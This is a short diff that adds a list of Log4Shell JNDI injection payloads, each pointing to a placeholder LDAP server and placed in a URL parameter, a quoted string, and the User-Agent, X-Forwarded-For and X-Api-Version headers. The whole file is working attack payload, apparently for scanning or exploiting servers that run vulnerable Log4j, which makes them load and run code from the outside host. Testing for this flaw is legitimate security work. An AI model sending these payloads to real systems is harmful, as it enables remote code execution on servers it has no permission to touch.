@@ -1,0 +1,6 @@
+"${jndi:ldap://{SERVER}}"
+
+URL_ENDPOINT?myparameter=${jndi:ldap://{SERVER}}
+User-Agent: Mozilla/5.0 ${jndi:ldap://{SERVER}}
+X-Forwarded-For: ${jndi:ldap://{SERVER}}
+X-Api-Version: ${jndi:ldap://{SERVER}}
